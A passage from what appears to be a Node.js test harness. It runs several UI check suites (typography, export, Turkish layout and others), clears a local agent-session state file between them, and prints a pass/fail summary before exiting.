  rmSync(join(PROJ, '_dream_context', 'state', '.agent-sessions.json'), { force: true });
  await runLostReport(base, report);
  await runFlowWrap(report);
  rmSync(join(PROJ, '_dream_context', 'state', '.agent-sessions.json'), { force: true });
  await runTypography(base, report);
  await runNarrowAndTurkish(report);
  await runSentenceIntegrity(report);
  rmSync(join(PROJ, '_dream_context', 'state', '.agent-sessions.json'), { force: true });
  await runExport(base, report);
} catch (err) {
  console.error('\nharness error:', err);
  report.rows.push({ theme: '-', label: `harness: ${err.message}`, cond: false, detail: '' });
} finally {
  server?.kill();
}

const failed = report.rows.filter((r) => !r.cond);
console.log(`\n${report.rows.length - failed.length}/${report.rows.length} checks passed`);
console.log(`screenshots: ${SHOTS}`);
if (failed.length) {
  console.log('\nfailed:');
  for (const r of failed) console.log(`  [${r.theme}] ${r.label}${r.detail ? ` — ${r.detail}` : ''}`);
}
process.exit(failed.length ? 1 : 0);
